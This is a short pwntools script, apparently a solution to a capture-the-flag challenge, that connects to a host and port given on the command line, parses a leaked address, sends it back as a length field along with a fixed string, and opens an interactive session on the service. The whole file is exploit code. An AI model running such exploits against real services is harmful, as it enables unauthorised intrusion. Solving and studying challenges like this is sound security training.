from pwn import *

p = remote(*(sys.argv[1].split(":")))

p.recvuntil(b'this: ')

r = int(p.recv(14), 16)
print(f'got_leaked_address: {r} -> 0x{r:02x}')

p.sendlineafter(b'length: ', str(r))
p.sendlineafter(b'song: ', b'gh0st69')
p.interactive()

